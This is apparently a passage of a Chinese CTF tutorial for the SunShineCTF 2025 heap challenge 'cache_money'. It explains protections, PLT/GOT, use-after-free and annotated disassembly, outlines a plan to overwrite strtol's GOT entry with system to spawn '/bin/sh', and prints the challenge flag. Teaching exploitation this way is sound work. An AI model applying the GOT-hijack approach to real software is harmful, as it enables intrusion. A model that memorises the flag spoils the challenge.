# SunShineCTF 2025 — pwn4 `cache_money` 完整教學筆記

> 這份筆記是寫給**完全沒碰過 heap exploit、也不知道 ROP/SROP 是什麼**的人看的。
> 我們會從「暫存器是什麼」開始，一路講到「為什麼 safe-linking 擋不住這個漏洞」。
> 所有位址、offset、chunk 大小都是我在 gdb 裡**實際看到**的，不是猜的。
>
> 📍 **閱讀順序建議**：完全沒學過 heap 的話，先讀 `wp/99_速查表.md` §8（chunk / bin /
> tcache / safe-linking 的迷你版），再回來讀本檔 §5（完整版）。
> 同一手法在 pwn6（`code_breaker`）會再用一次，那份筆記的 §4 會回頭引用本檔 §5。

---

## 1. 題目資訊

| 項目 | 內容 |
|---|---|
| 檔案 | `cache_money`（x86-64 ELF，stripped 沒有符號表） |
| 遠端 | `chal.sunshinectf.games:26004` |
| Flag 格式 | `sun{...}` |
| 真實 flag | `sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}` |
| 編譯環境 | `GCC: (Ubuntu 13.3.0-6ubuntu2~24.04)` → Ubuntu 24.04，**glibc 2.39** |
| 程式類型 | 純 heap 題（wallet manager），沒有任何 stack overflow |

執行起來的畫面：

```
============================================
   $$$ CACHE MONEY Crypto Wallet Manager $$$
       "Your coins, our heap."
============================================

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>>
```

### 檔案清單（我的工作目錄）

```
cache_money              題目本體（non-PIE, stripped）
exploit.py               最終 exploit（local / REMOTE）
FLAG.txt                 真實遠端 flag
libc.so.6                Ubuntu 24.04 glibc 2.39-0ubuntu8.3（從 pwn2/pwn6 借來對齊遠端）
ld-linux-x86-64.so.2     對應的 loader
flag.txt                 本地測試用假 flag
dis.txt                  objdump -d -M intel 的完整反組譯
cm_dbg                   patchelf 過的除錯副本（把 interpreter 指到本地 2.39 loader）
work/                    開發過程的 gdb script 與實驗腳本
```

> **為什麼要自己放一份 libc？**
> `cache_money` 的 `RUNPATH` 是 `$ORIGIN`（先找執行檔旁邊），但題目沒附 libc。
> 本機 Arch Linux 的 libc 是 2.44，跟遠端的 2.39 **行為與 offset 都不一樣**。
> 這題的編譯器 metadata 顯示是 Ubuntu 24.04，而同一場 CTF 的 pwn2/pwn6 都附了
> `Ubuntu GLIBC 2.39-0ubuntu8.3`，所以我把那份 libc 複製過來，本地就能 100% 對齊遠端。
> 沒放 libc 時 `exploit.py` 會直接跑 `./cache_money`（本機系統 libc），照樣能動，
> 只是 local 的 libc offset 不同 → exploit 會靠 leak 自己算 base，但 `system` 的 offset
> 是寫死 2.39 的，所以**本地驗證請務必用 2.39**。

---

## 2. 保護機制（checksec）

```
$ readelf -h cache_money | grep Type
  Type: EXEC (Executable file)          <- non-PIE
$ readelf -l cache_money | grep -A1 GNU_RELRO
  GNU_RELRO 0x2dc0 0x403dc0 0x403dc0    <- 保護範圍 0x403dc0 ~ 0x404000（size 0x240）
    0x240 0x240 R 0x1                        = .init_array/.fini_array/.got
                                             ＋ .got.plt 的前 0x18 bytes
$ readelf -S cache_money | grep -E "\.got|\.init_array|\.fini_array"
  [20] .init_array  0000000000403dc0     <- 在 RELRO 內（唯讀）
  [21] .fini_array  0000000000403dd0     <- 在 RELRO 內（唯讀）
  [23] .got         0000000000403fd8     <- ★ 也在 RELRO 內（唯讀）
  [24] .got.plt     0000000000403fe8     <- 只有前 0x18 bytes（到 0x404000）被保護
$ objdump -R cache_money | head             # 函式 GOT 從 0x404000 起 → 可寫 ✔
$ readelf -d cache_money | grep -i bind  <- 沒有 BIND_NOW
  (空)
$ readelf -d cache_money | grep FLAGS
  0x1e (FLAGS)      ORIGIN
```

| 保護 | 狀態 | 白話解釋 | 對解題的影響 |
|---|---|---|---|
| **PIE** | ❌ 關閉（non-PIE） | 程式碼/資料段**不會**被 ASLR 隨機化，永遠載入到 `0x400000` | **超大幫助**：`0x4040c0`（slot 表）、`0x404040`（strtol 的 GOT）等位址都是固定常數，可以寫死在 exploit 裡 |
| **Canary** | ✅ 開啟 | 每個函式在 stack frame 放一個隨機值，函式返回前比對（`sub rax, fs:0x28`），被改到就 `__stack_chk_fail` 自殺 | 擋掉「直接蓋 return address」的老招；但這題是 heap 題，我們**根本不去碰 stack**，所以 canary 完全沒造成困擾 |
| **NX** | ✅ 開啟 | stack/heap 不可執行 | 不能把 shellcode 丟到 heap 上執行 → 要走 ret2libc / GOT hijack 這條路 |
| **RELRO** | ⚠️ Partial | RELRO 覆蓋 `0x403dc0~0x404000`（size 0x240）：`.init_array`/`.fini_array` 和 **`.got`（`0x403fd8`）都變唯讀**，`.got.plt` 只有開頭 0x18 bytes 落在保護範圍內。**可寫的是 `0x404000` 之後的「函式 GOT 項目」（含 `strtol@0x404040`）** | 我們可以把 `strtol@got` 改成 `system` |
| **ASLR** | ✅ 開啟 | libc/heap/stack 的位址每次執行都不同 | 必須先**洩漏（leak）** libc base 與 heap 資訊 |

### 這四個保護合起來告訴我們什麼？

1. non-PIE → 程式自己的位址固定 → 有「固定的攻擊目標」。
2. Partial RELRO → GOT 可寫 → 有「固定的寫入目標」。
3. NX + canary → 不能用 stack smash → 想辦法**改 GOT**或**改程式自己的資料**。
4. ASLR → 需要資訊洩漏（leak）。

結論：**這題的解法一定是「heap 漏洞 → leak libc → 寫 GOT」**。

---

## 3. 必備基礎知識

### 3.1 暫存器的用途（x86-64）

```
rax  累加器，函式「回傳值」放這裡（系統呼叫編號也放這）
rbx  被呼叫者保存（callee-saved），函式必須原樣還回去
rcx  第 4 個參數 / 計數器
rdx  第 3 個參數
rsi  第 2 個參數（在 libc 函式裡常叫 "src"）
rdi  第 1 個參數（常叫 "dst"）
rbp  框架指標 (frame pointer)，指向目前 stack frame 的底部
rsp  堆疊指標 (stack pointer)，永遠指向堆疊最頂端（最低位址）
r8, r9  第 5、6 個參數（r10、r11 是 caller-saved 暫存器，**不是**參數暫存器；
         r10 只在 syscall 時當第 4 個參數）
r12~r15 被呼叫者保存
rip  下一條要執行的指令位址
fs   執行緒區域儲存區的段暫存器；fs:0x28 就是 **stack canary**
```

### 3.2 System V AMD64 呼叫慣例（Linux 上函式怎麼傳參數）

| 順序 | 1 | 2 | 3 | 4 | 5 | 6 | 7+ |
|---|---|---|---|---|---|---|---|
| 暫存器 | `rdi` | `rsi` | `rdx` | `rcx` | `r8` | `r9` | 放 stack |

- 回傳值在 `rax`。
- 呼叫前 `rsp` 必須 16 位元組對齊（`call` 會壓 8 bytes 返回位址，所以函式入口是 `rsp % 16 == 8`）。
- 所以在反組譯裡看到 `mov edi, 2` / `lea rsi, [...]` / `mov edx, ...` 就是在「排參數」。

例：本題 `Withdraw` 印餘額的那段

```
401972: mov    rdx,QWORD PTR [rbx+0x10]   ; 第 3 參數 = balance
401976: add    rsp,0x30
40197a: lea    rsi,[rip+0xc32]      ; 第 2 參數 = 格式字串 # 4025b3
401981: xor    eax,eax              ; 可變參數函式要先清 eax
401983: mov    edi,0x2              ; 第 1 參數 = __printf_chk 的 flag
401988: pop    rbx
401989: jmp    4011b0 <__printf_chk@plt>   ; ★ 尾呼叫（tail call）：用 jmp 不是 call
```

### 3.3 `call` / `ret` / `leave` / stack frame

```asm
call 0x401510     ; 等價於 push <下一條指令位址>; jmp 0x401510
                  ; 把「返回位址」壓進 stack，之後 ret 才知道要回哪

ret               ; 等價於 pop rip  → 從 stack 取出一個位址跳過去
                  ; ★ 這就是為什麼「蓋掉 stack 上的返回位址」可以控制執行流

push rbp          ; 函式開頭常見：保存呼叫者的 rbp
mov  rbp, rsp     ; 建立自己的 stack frame
sub  rsp, 0x38    ; 配置區域變數空間
...
leave             ; 等價於 mov rsp, rbp; pop rbp  （拆除 stack frame）
ret
```

一個函式的 stack frame 長這樣（位址往下長）：

```
   高位址
   ┌──────────────────────┐
   │ 呼叫者的區域變數     │
   ├──────────────────────┤
   │ 返回位址 (8 bytes)   │  <-- 覆蓋這裡 = 控制執行流（本題用不到）
   ├──────────────────────┤  <-- rbp 進函式前
   │ 舊的 rbp             │
   ├──────────────────────┤  <-- rbp（frame pointer）
   │ 區域變數             │
   │ ...                  │
   │ [rsp+0x28] canary    │  <-- fs:0x28 的副本
   ├──────────────────────┤  <-- rsp
   低位址
```

### 3.4 PLT / GOT：動態連結的「電話簿」

程式呼叫 `strtol` 時，其實是呼叫 `strtol@plt`：

```
0000000000401190 <strtol@plt>:
  401190: endbr64
  401194: jmp QWORD PTR [rip+0x2ea6]   # 404040 <-- strtol 的 GOT
```
（`0x401194 + 6 + 0x2ea6 = 0x404040` ✔ —— rip 是「**下一條指令**」的位址，
所以是加 6，不是加 5。）

- **GOT**（`.got.plt`，本題在 `0x404000` 起）是一張表，每一格存「真正的 libc 函式位址」。
- 第一次呼叫時，GOT 裡還指向 PLT 的解析器；libc 解析完後會**把真正的位址寫進 GOT**。
- 之後每次呼叫都直接 `jmp [got]` → 直奔 libc。

> **Partial RELRO 的意思是：這張表還可以被寫！**
> 所以只要我們能「寫任意位址」，把 `0x404040`（`strtol` 的格子）改成 `system` 的位址，
> 程式之後每次呼叫 `strtol` 其實都在呼叫 `system`。

本題的 GOT 表（`objdump -R`）：

```
0x404000 free        0x404028 read        0x404050 __printf_chk
0x404008 puts        0x404030 fgets       0x404058 setvbuf
0x404010 write       0x404038 calloc      0x404060 __memset_chk
0x404018 __stack_chk_fail 0x404040 strtol 0x404068 exit
0x404020 strcspn     0x404048 malloc
```

### 3.5 `malloc` / `calloc` / `free` 到底在做什麼

這是 heap 題的全部基礎，用「圖書館管理員」比喻：

- **`malloc(n)`**：跟 glibc 要「至少 n bytes」的空記憶體，回傳一個**指標**。
  實際上給你的區塊比 n 大（有 header、有對齊），這個區塊叫 **chunk**。
- **`calloc(a, b)`**：要 `a*b` bytes，而且**保證內容是 0**。
  （本題的 wallet 結構就是用 `calloc(1, 0x30)` 開的。）
- **`free(p)`**：把 p 指向的 chunk「還給」glibc，並把它記到某個 **bin（回收桶）** 裡，
  下次 `malloc` 就能重複利用。**free 之後那塊記憶體的內容不會被清掉**，
  而且**指標變數 p 本身還是同一個值**（不會自動變 NULL）。
  → 這就是 use-after-free（UAF）的根源：**free 了但指標還能用**。

glibc 拿記憶體的方式主要有兩種：

```
        brk / sbrk（主執行緒的 heap，位址在程式後方，例如 0x405000）
        ─────────────────────────────────────────────
        [heap 起點] ...程式一直 malloc... [top chunk] ← 不夠就往上長

        mmap（很大的配置 > 128KB 時，位址在 0x7f... 附近）
```

本題所有 chunk 都來自 **主 arena（brk heap）**，所以 heap 位址是連續的。

---

## 4. 逐行組語解說

> 位址都是 `objdump -d -M intel cache_money` 出來的真實位址。
> §4.2~§4.6 的組語區塊是**直接從 `objdump` 貼過來的**（只拿掉機器碼那一欄、
> 加上 `←` 的中文註解），所以你可以逐條在自己的 objdump 裡對位址。
> 為了可讀性我省略了部分 `endbr64`／`nop`（CET 用的填充指令，沒有實際作用），
> 但**每一條有語意的指令位址都與 binary 一致**。

### 4.1 `main`：程式入口與選單分派（0x4011f0）

```
4011f0: endbr64
4011f4: push   rbp
4011f5: lea    rbp,[rip+0x14b0]     # 4026ac   ← 跳表的位址（不是 frame pointer！）
4011fc: push   rbx
4011fd: sub    rsp,0x38                       ← 開 0x38 bytes 的區域空間
401201: mov    rax,QWORD PTR fs:0x28           ← 拿出 canary
40120a: mov    QWORD PTR [rsp+0x28],rax        ← 存到 stack
401211: mov    rbx,rsp                         ← rbx = 輸入緩衝區（等等 fgets 用）
401214: call   4013e0                          ← print_banner()
401219: call   401420                          ← print_menu()  ← 迴圈起點
40121e: mov    rdx,QWORD PTR [rip+0x2e6b]      # 404090 = stdin
401225: mov    esi,0x20                        ← 最多讀 0x20-1 個字
40122a: mov    rdi,rbx                         ← buf
40122d: call   fgets@plt                       ← fgets(buf, 0x20, stdin)
401232: test   rax,rax
401235: je     401264                          ← 讀到 EOF → exit(0)
401237: xor    esi,esi                         ← strtol 第 2 參數 = NULL
401239: mov    edx,0xa                         ← 第 3 參數 = 10（十進位）
40123e: mov    rdi,rbx
401241: call   strtol@plt                      ← 選單選項 = strtol(buf, NULL, 10)
401246: cmp    eax,0x6
401249: ja     401295                          ← 大於 6 → 印「Invalid option」
40124b: mov    eax,eax                         ← 清掉高位（無號）
40124d: movsxd rax,DWORD PTR [rbp+rax*4]       ← ★ 32-bit 相對跳表
401252: add    rax,rbp
401255: notrack jmp rax                        ← 跳到對應的 handler
```

跳表內容（`0x4026ac` 開始，每格 4 bytes 的「相對位移」）：

```
選項 0 → 401258  puts("Cashing out...") ; exit(0)
選項 1 → 401287  Open Wallet   (0x4015b0)
選項 2 → 401280  Deposit       (0x4017d0)
選項 3 → 401279  Withdraw      (0x4018a0)
選項 4 → 401272  Transfer      (0x401a10)
選項 5 → 40126b  Close Wallet  (0x401b60)
選項 6 → 40128e  List Wallets  (0x401c90)
```

> 注意 `strtol(buf, NULL, 10)`：**輸入的第一個 token 會被當成整數**。
> 這正是我們最後把 `strtol@got` 改成 `system` 之後，輸入 `/bin/sh` 就能拿到 shell 的原因：
> `strtol("/bin/sh", NULL, 10)` 會回傳 0，但**在那之前 GOT 已經被換成 system**，
> 所以實際執行的是 `system("/bin/sh")`（rdi = buf = `"/bin/sh"`）。

```
4012b0: (建構子起點) setvbuf(stdout, NULL, 2, 0)   ← 呼叫在 0x4012c8；mode 2 = _IONBF = 完全不用緩衝
4012cd: (同一支)      setvbuf(stderr, NULL, 2, 0)   ← 呼叫在 0x4012e1
```
**stdout 是 unbuffered**，這對互動式 exploit 很重要（每一行輸出會立刻送出）。
但注意：**stdin 仍然有緩衝**，這個坑在 §10 會詳細講。

### 4.2 `read_int(rdi = prompt)`：共用的「問一個 0~15 的數字」（0x401510）

```
401510: endbr64
401514: push   rbx
401515: mov    rdx,rdi                 ← rdx = prompt 字串
401518: lea    rsi,[rip+0xfdb]         # 4024fa = "%s (0-%d): "
40151f: mov    edi,0x2                 ← __printf_chk 的 flag
401524: mov    ecx,0xf                 ← 第二個可變參數 = 15
401529: sub    rsp,0x30
40152d: mov    rax,QWORD PTR fs:0x28   ← canary
401536: mov    QWORD PTR [rsp+0x28],rax
40153b: xor    eax,eax
40153d: mov    rbx,rsp                 ← rbx = 本地緩衝區
401540: call   4011b0 <__printf_chk@plt>  ← printf("%s (0-%d): ", prompt, 15)
401545: mov    rdx,QWORD PTR [rip+0x2b44]   # 404090 = stdin
40154c: mov    esi,0x20
401551: mov    rdi,rbx
401554: call   401170 <fgets@plt>       ← fgets(buf, 0x20, stdin)
401559: test   rax,rax
40155c: je     401590                  ← ★★ EOF（fgets 回 NULL）→ 走 401590
40155e: mov    edx,0xa
401563: xor    esi,esi
401565: mov    rdi,rbx
401568: call   401190 <strtol@plt>
40156d: mov    edx,eax                 ← 只留低 32 bits（沒有 movsxd！）
40156f: cmp    eax,0xf                 ← ★ 32-bit 無號比較
401572: ja     401597                  ← > 15 → puts("Invalid wallet index") 後回 -1
401574: mov    rax,QWORD PTR [rsp+0x28]
401579: sub    rax,QWORD PTR fs:0x28   ← canary 檢查
401582: jne    4015aa <__stack_chk_fail@plt>
401584: add    rsp,0x30
401588: mov    eax,edx                 ← 回傳值 = 使用者輸入的 index
40158a: pop    rbx
40158b: ret
401590: xor    edi,edi                 ← ★★ fgets 失敗（EOF）走這裡
401592: call   4011e0 <exit@plt>        ← exit(0)：**不是**回傳 -1！
401597: lea    rdi,[rip+0xf68]         # 402506 = "[!] Invalid wallet index."
40159e: call   401120 <puts@plt>
4015a3: mov    edx,0xffffffff          ← 只有「格式不合法」才會得到 -1
4015a8: jmp    401574                  ← 跳回 canary 檢查
4015aa: call   401140 <__stack_chk_fail@plt>
```

**重點 1：index 有做 `0..15` 的上界檢查，沒有負索引漏洞。**
負數／太大的值是用 **`cmp eax,0xf` + `ja`（32-bit 無號比較）一次擋掉**的：
`strtol("-1")` 回傳 `0xffffffff`，當成無號就是 4294967295 > 15 → 直接 invalid。
所以「沒有負索引」這個結論是對的，但理由不是「先檢查 `js` 再看上界」。

**重點 2：EOF 不是「回 -1」，而是 `exit(0)`。**
`40155c: je 401590` → `401590: xor edi,edi; call exit@plt`。
這也是 exploit 最後用 `recvrepeat` 收尾時，程式會自己安靜結束的原因
（`fgets` 讀到 EOF → `exit(0)`，而不是回 -1 讓選單繼續跑）。

### 4.3 `Open Wallet`（起點 0x4015b0，slot 掃描迴圈從 0x4015e0 開始）：建立 wallet

```
4015b0: endbr64                        ← ★ 函式真正起點（main 的 401287 是 `call 4015b0`）
4015b4: push   r13
4015b6: push   r12
4015b8: push   rbp
4015b9: lea    rbp,[rip+0x2b00]        # 4040c0  ← ★ slot 表基底
4015c0: push   rbx
4015c1: xor    ebx,ebx                 ← ebx = 候選 slot index = 0
4015c3: sub    rsp,0x38                ← 開 0x38 bytes 的區域空間（不是 0x20）
4015c7: mov    rax,QWORD PTR fs:0x28   ← canary
4015d0: mov    QWORD PTR [rsp+0x28],rax
4015d5: xor    eax,eax
      ┌── 找第一個空的 slot ────────────────────────────────
4015e0: cmp    QWORD PTR [rbp+rbx*8+0x0],0x0  ← slots[i] == NULL ?
4015e6: je     401620                          ← 找到空的 → 跳出
4015e8: add    rbx,0x1
4015ec: cmp    rbx,0x10                        ← 試到 16
4015f0: jne    4015e0
      │ (16 個都滿了)
4015f2: mov    rax,QWORD PTR [rsp+0x28]
4015f7: sub    rax,QWORD PTR fs:0x28          ← canary 檢查
401600: jne    4017ca <__stack_chk_fail@plt>
401606: lea    rdi,[rip+0xb73]                 # 402180 "[!] All wallet slots are full..."
40160d: add    rsp,0x38
401611: pop    rbx
401612: pop    rbp
401613: pop    r12
401615: pop    r13
401617: jmp    401120 <puts@plt>                ← 尾呼叫 puts(...)，然後返回
      └────────────────────────────────────────────────────
401620: mov    esi,0x1                 ← calloc 的 size  = 1
401625: mov    edi,0x30                ← calloc 的 nmemb = 0x30 → 共 0x30 bytes
40162a: call   401180 <calloc@plt>     ← ★ 配置 wallet 結構
40162f: mov    r12,rax                 ← r12 = wallet 指標
401632: test   rax,rax
401635: je     4017af                  ← 失敗 → "[!] Out of memory."
40163b: mov    edx,ebx
40163d: lea    rsi,[rip+0xa6c]         # 4020b0 "[+] Opening wallet in slot #%d\n"
401644: mov    edi,0x2
401649: xor    eax,eax
40164b: call   4011b0 <__printf_chk@plt>   ← printf("[+] Opening wallet in slot #%d\n", ebx)
401650: lea    rsi,[rip+0xedc]         # 402533 "    Wallet name: "
401657: mov    edi,0x2
40165c: xor    eax,eax
40165e: call   4011b0 <__printf_chk@plt>   ← printf("    Wallet name: ")
401663: mov    rdx,QWORD PTR [rip+0x2a26]   # 404090 = stdin
40166a: mov    esi,0x10                ← ★ 最多 0x10-1 = 15 個字
40166f: mov    rdi,r12                 ← 直接寫進 wallet+0x00
401672: call   401170 <fgets@plt>      ← fgets(wallet->name, 0x10, stdin)
401677: test   rax,rax
40167a: je     401780                  ← EOF → exit(0)
401680: lea    rsi,[rip+0xff6]         # 40267d  "\n"   ← ★ 是 rsi（strcspn 的第 2 參數）
401687: mov    rdi,r12
40168a: mov    r13,rsp                 ← r13 = 本地緩衝區（等等讀 size 字串用）
40168d: call   401150 <strcspn@plt>    ← strcspn(name, "\n")
401692: mov    edx,0x20                ← printf 的第 3 個可變參數 = 0x20
401697: mov    edi,0x2
40169c: lea    rsi,[rip+0xa2d]         # 4020d0 "    Ledger size (0x%x - 0x%x): "
4016a3: mov    BYTE PTR [r12+rax*1],0x0    ← name[該位置] = '\0'（去掉換行）
4016a8: mov    ecx,0x100               ← printf 的第 4 個可變參數 = 0x100
4016ad: xor    eax,eax
4016af: call   4011b0 <__printf_chk@plt>   ← 印 "Ledger size (0x20 - 0x100): "
4016b4: mov    rdx,QWORD PTR [rip+0x29d5]   # 404090 = stdin
4016bb: mov    esi,0x20
4016c0: mov    rdi,r13
4016c3: call   401170 <fgets@plt>      ← fgets(rsp, 0x20, stdin)：讀 size 字串
4016c8: test   rax,rax
4016cb: je     401780                  ← EOF → exit(0)
4016d1: mov    rdi,r13
4016d4: mov    edx,0xa
4016d9: xor    esi,esi
4016db: call   401190 <strtol@plt>     ← 十進位
4016e0: movsxd r13,eax                 ← r13 = size
4016e3: lea    rax,[r13-0x20]          ← size - 0x20
4016e7: cmp    rax,0xe0
4016ed: ja     401790                  ← ★ 無號 > 0xe0 → 不合法
4016f3: mov    QWORD PTR [r12+0x20],r13     ← wallet->size = size
4016f8: mov    rdi,r13
4016fb: call   4011a0 <malloc@plt>     ← ★ 配置 ledger
401700: mov    QWORD PTR [r12+0x18],rax     ← wallet->ledger = 指標
401705: mov    rdi,rax
401708: test   rax,rax
40170b: je     4017a7                  ← malloc 失敗 → free(wallet) + "[!] Out of memory."
401711: xor    esi,esi                 ← memset 的值 = 0
401713: mov    rcx,r13                 ← destlen = size
401716: mov    rdx,r13                 ← n = size
401719: movsxd rbx,ebx                 ← ebx（slot index）轉成 64-bit（等一下存回 slots[]）
40171c: call   4011d0 <__memset_chk@plt>   ← ★ memset(ledger, 0, size)
401721: xor    eax,eax
401723: mov    rcx,r13                 ← 參數：size
401726: mov    rdx,r12                 ← 參數：wallet 指標（給 %s 印名字）
401729: mov    QWORD PTR [r12+0x10],0x0     ← wallet->balance = 0
401732: lea    rsi,[rip+0x9e7]         # 402120 "[+] Wallet \"%s\" opened (%zu-byte ledger).\n"
401739: mov    edi,0x2
40173e: mov    DWORD PTR [r12+0x28],0x1     ← ★ wallet->active = 1
401747: mov    QWORD PTR [rbp+rbx*8+0x0],r12  ← ★ slots[index] = wallet
40174c: call   4011b0 <__printf_chk@plt>
401751: mov    rax,QWORD PTR [rsp+0x28]
401756: sub    rax,QWORD PTR fs:0x28   ← canary 檢查
401765: lea    rdi,[rip+0x9e4]         # 402150 "    Start depositing to build your fortune!"
401772: jmp    401120 <puts@plt>
      └─ 401790: 不合法 → puts("Size out of range. Defaulting to 0x80.")；
                  r13d = 0x80；jmp 4016f3（用預設大小繼續）
```

**檢查邏輯：`(unsigned)(size - 0x20) <= 0xe0` → `0x20 <= size <= 0x100`。**
負數因無號比較會被判不合法（會退回預設 `0x80`）。

#### Wallet 結構（`calloc(1, 0x30)`，chunk size 0x40）

```
wallet 指標 W →
   +0x00  char   name[16]     ← fgets(name, 0x10)，最多 15 個字 + NUL
   +0x10  uint64 balance      ← 每次 Deposit 加上「實際讀到的位元組數」
   +0x18  void  *ledger       ← ★ malloc(size) 的回傳值（我們要玩弄的目標）
   +0x20  uint64 size         ← ledger 大小（0x20..0x100）
   +0x28  uint32 active       ← 1 = 有效，0 = 已關閉/已轉出
   +0x2c  (4 bytes padding)
```

#### slot 表（`struct wallet *slots[16]`）

```
位址 0x4040c0 ─┬─ slots[0]  0x4040c0
               ├─ slots[1]  0x4040c8
               ├─ ...
               └─ slots[15] 0x404138   （表尾 0x404140）
```
16 個 8-byte 指標，就在 `.bss` 裡，**non-PIE 所以位址固定**。

### 4.4 `Deposit`（0x4017d0）：**可控制長度的任意讀寫雛型**

```
4017d0: endbr64
4017d4: push   rbx
4017d5: lea    rdi,[rip+0xd69]        # 402545 "Deposit into which wallet?"
4017dc: call   401510                 ← index = read_int(prompt)
4017e1: test   eax,eax
4017e3: js     40184a                 ← 負數（= invalid）→ 直接 pop/ret
4017e5: cdqe
4017e7: lea    rdx,[rip+0x28d2]       # 4040c0
4017ee: mov    rbx,QWORD PTR [rdx+rax*8]      ← rbx = slots[index]
4017f2: test   rbx,rbx
4017f5: je     401850                 ← NULL → "[!] That wallet is not active."
4017f7: mov    eax,DWORD PTR [rbx+0x28]
4017fa: test   eax,eax
4017fc: je     401850                 ← active == 0 → 同上
4017fe: cmp    QWORD PTR [rbx+0x18],0x0
401803: je     401888                 ← ledger == NULL → "has no ledger"
401809: mov    rcx,QWORD PTR [rbx+0x20]        ← 參數：size
40180d: mov    rdx,rbx                         ← 參數：wallet 指標（當 %s 用）
401810: lea    rsi,[rip+0x9e9]                 # 402200 "    Depositing into \"%s\" (ledger: %zu bytes)\n"
401817: xor    eax,eax
401819: mov    edi,0x2
40181e: call   4011b0 <__printf_chk@plt>
401823: lea    rsi,[rip+0xd36]                 # 402560 "    Enter transaction data: "
40182a: mov    edi,0x2
40182f: xor    eax,eax
401831: call   4011b0 <__printf_chk@plt>       ← printf("    Enter transaction data: ")
401836: mov    rdx,QWORD PTR [rbx+0x20]        ← ★ 長度 = wallet->size
40183a: mov    rsi,QWORD PTR [rbx+0x18]        ← ★ 目的地 = wallet->ledger
40183e: xor    edi,edi                         ← fd = 0 (stdin)
401840: call   401160 <read@plt>               ← ★★ read(0, ledger, size)
401845: test   rax,rax
401848: jg     401860
40184a: pop    rbx
40184b: ret                                    ← read() 回 <= 0（EOF）就直接返回
401850: lea    rdi,[rip+0x959]                 # 4021b0 "[!] That wallet is not active."
401857: pop    rbx
401858: jmp    401120 <puts@plt>
401860: mov    rcx,QWORD PTR [rbx+0x10]        ← balance
401864: mov    rdx,rax                         ← 第 3 參數 n = 實際讀到幾個 byte
401867: mov    edi,0x2
40186c: lea    rsi,[rip+0x9bd]                 # 402230 "[+] Deposited %zd bytes. New balance: %lu\n"
401873: add    rcx,rax
401876: xor    eax,eax
401878: mov    QWORD PTR [rbx+0x10],rcx        ← balance += n
40187c: pop    rbx
40187d: jmp    4011b0 <__printf_chk@plt>       ← 尾呼叫印 "[+] Deposited ..."
401888: lea    rdi,[rip+0x941]                 # 4021d0 "[!] Wallet has no ledger..."
40188f: pop    rbx
401890: jmp    401120 <puts@plt>
```

**這支函式的重點**：
- 它讀寫的位置與長度完全由 `wallet->ledger` 與 `wallet->size` 決定。
- 如果我們能讓某個 wallet 的 `ledger` 指向 **slot 表**、`size` = 0x20，
  那 Deposit 就變成「把 32 bytes 寫進 slot 表」→ 之後就能用假 wallet 為所欲為。
- **它是唯一使用 raw `read(0, ...)` 的操作**（其他都是 `fgets`）——這是後面
  pipelining 大坑的來源。

### 4.5 `Withdraw`（0x4018a0）：**任意讀**

```
4018a0: endbr64
4018a4: push   rbx
4018a5: mov    edi,0x2
4018aa: mov    ecx,0xf
4018af: lea    rdx,[rip+0xcc7]        # 40257d "Withdraw from which wallet?"
4018b6: lea    rsi,[rip+0xc3d]        # 4024fa "%s (0-%d): "
4018bd: sub    rsp,0x30                ← 開 0x30（不是 0x20）
4018c1: mov    rax,QWORD PTR fs:0x28   ← canary
4018ca: mov    QWORD PTR [rsp+0x28],rax
4018cf: xor    eax,eax
4018d1: mov    rbx,rsp
4018d4: call   4011b0 <__printf_chk@plt>   ← 印 prompt
4018d9: mov    rdx,QWORD PTR [rip+0x27b0]  # 404090 = stdin
4018e0: mov    esi,0x20
4018e5: mov    rdi,rbx
4018e8: call   401170 <fgets@plt>      ← fgets(rsp, 0x20, stdin)
4018ed: test   rax,rax
4018f0: je     4019b8                  ← EOF → exit(0)
4018f6: xor    esi,esi
4018f8: mov    edx,0xa
4018fd: mov    rdi,rbx
401900: call   401190 <strtol@plt>
401905: cmp    eax,0xf
401908: ja     4019e1                  ← > 15 → invalid
40190e: cdqe
401910: lea    rdx,[rip+0x27a9]        # 4040c0
401917: mov    rbx,QWORD PTR [rdx+rax*8]    ← rbx = slots[index]
40191b: test   rbx,rbx
40191e: je     401990                  ← 未使用
401920: mov    eax,DWORD PTR [rbx+0x28]
401923: test   eax,eax
401925: je     401990                  ← not active
401927: cmp    QWORD PTR [rbx+0x18],0x0
40192c: je     4019c0                  ← 沒有 ledger
401932: mov    rcx,QWORD PTR [rbx+0x20]     ← size
401936: mov    rdx,rbx
401939: lea    rsi,[rip+0x920]              # 402260 "[+] Ledger contents for \"%s\" (%zu bytes):\n    "
401940: xor    eax,eax
401942: mov    edi,0x2
401947: call   4011b0 <__printf_chk@plt>
40194c: mov    rdx,QWORD PTR [rbx+0x20]     ← ★ 長度 = wallet->size
401950: mov    rsi,QWORD PTR [rbx+0x18]     ← ★ 來源 = wallet->ledger
401954: mov    edi,0x1                       ← fd = 1 (stdout)
401959: call   401130 <write@plt>           ← ★★ write(1, ledger, size)
40195e: mov    rax,QWORD PTR [rsp+0x28]
401963: sub    rax,QWORD PTR fs:0x28        ← canary 檢查
40196c: jne    401a02 <__stack_chk_fail@plt>
401972: mov    rdx,QWORD PTR [rbx+0x10]      ← 第 3 參數 balance
401976: add    rsp,0x30
40197a: lea    rsi,[rip+0xc32]              # 4025b3 "\n[+] Current balance: %lu\n"
401981: xor    eax,eax
401983: mov    edi,0x2
401988: pop    rbx
401989: jmp    4011b0 <__printf_chk@plt>    ← 尾呼叫印 "\n[+] Current balance: ..."
```

**Withdraw 是完美的資訊洩漏管道**：長度可到 `0x100`，而且**它不檢查 ledger 是否已被 free**。

### 4.6 `Transfer`（0x401a10）：**漏洞就在這裡**

```
401a10: endbr64
401a14: push   rbp
401a15: lea    rdi,[rip+0xbb2]        # 4025ce "Transfer FROM which wallet?"
401a1c: push   rbx
401a1d: sub    rsp,0x8
401a21: call   401510                 ← read_int
401a26: test   eax,eax
401a28: js     401aa0                 ← 取消
401a2a: lea    rbp,[rip+0x268f]       # 4040c0  ← rbp = slot 表
401a31: cdqe
401a33: mov    rbx,QWORD PTR [rbp+rax*8]    ← ★ rbx = src wallet
401a38: test   rbx,rbx
401a3b: je     401a88                  ← NULL → "Source wallet is not active."
401a3d: mov    edx,DWORD PTR [rbx+0x28]
401a40: test   edx,edx
401a42: je     401a88                  ← src->active == 0 → 同上
401a44: cmp    QWORD PTR [rbx+0x18],0x0
401a49: je     401b40                  ← src->ledger == NULL
401a4f: lea    rdi,[rip+0xb94]        # 4025ea "Transfer TO which wallet?"
401a56: call   401510                 ← read_int
401a5b: test   eax,eax
401a5d: js     401aa0
401a5f: cdqe
